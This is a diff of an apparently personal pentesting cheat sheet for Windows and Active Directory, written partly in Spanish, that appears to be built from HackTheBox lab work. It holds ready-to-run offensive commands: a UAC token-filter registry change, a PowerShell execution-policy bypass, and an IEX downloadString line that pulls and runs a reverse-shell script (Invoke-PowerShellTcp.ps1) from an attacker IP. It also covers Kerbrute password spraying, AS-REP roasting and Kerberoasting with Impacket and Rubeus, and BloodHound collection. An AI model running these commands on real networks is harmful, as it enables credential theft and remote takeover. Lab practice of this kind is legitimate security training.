@@ -1,12 +1,17 @@
 # Windows
 
+
 ## Crackmapexec `(Pwn3d!)`
+
 
 `cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`
 
+
 ## Powershell
 
+
 ### Bypass de execution policy
+
 
 ```powershell
 powerShell.exe -ExecutionPolicy Bypass .\script.ps1
@@ -14,7 +19,9 @@ powerShell.exe -ExecutionPolicy Bypass .\script.ps1
 
 Refs: https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
 
+
 ### Invoke command providing credentials
+
 
 ```powershell
 $userName = 'WORKGROUP\Hector'
@@ -32,7 +39,101 @@ Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock {C:\W
 Start-Process -FilePath 'powershell' -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')" -Credential $credObject
 ```
 
-## PowerView
+
+## AD Environment
+
+
+### Kerbrute
+
+
+#### Enumeración de usuarios
+
+
+```bash
+./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt
+```
+
+
+#### Password Spraying
+
+
+```bash
+sudo ntpdate 10.10.11.129
+./kerbrute passwordspray --dc CONTROLLER.local -d CONTROLLER.local users.txt Password123
+```
+
+
+### AS-REP Roasting
+
+
+#### Impacket
+
+
+```bash
+for user in $(cat users.txt); do impacket-GetNPUsers -dc-ip <ip_de_dominio> <dominio>/${user} -no-pass | grep -v Impacket; done
+```
+
+
+#### Rubeus
+
+
+```powershell
+.\Rubeus.exe asreproast # ¿como admin? Ver si se necesitan credenciales
+## .\Rubeus.exe asreproast /creduser:htb.local\amanda /credpassword:Password123 # TODO Verificar
+```
+
+
+### Kerberoasting
+
+
+#### Impacket
+
+
+```bash
+impacket-GetUserSPNs {dominio/usuario:contraseña} -dc-ip {ip de dominio} -request
+```
+
+
+#### Rubeus
+
+
+```powershell
+.\Rubeus.exe kerberoast # Como Administrator
+.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Password123
+```
+
+
+### BloodHound
+
+
+#### BloodHound.py
+
+
+**Nota: Al recopilar la info con la última versión es recomendable usar a su vez también la última versión del visualizador.**
+
+
+##### Setup
+
+
+[Repositorio Github](https://github.com/fox-it/BloodHound.py)
+
+```bash
+pyenv ...
+git clone https://github.com/fox-it/BloodHound.py.git
+cd BloodHound.py
+python setup.py install
+```
+
+
+##### Uso
+
+
+```bash
+python bloodhound.py -u hope.sharp -p 'Password123' -d search.htb -ns 10.10.11.129 -c All
+```
+
+
+### PowerView
 
 | Name | Description | Suggested Execution |
 |---|---|---|
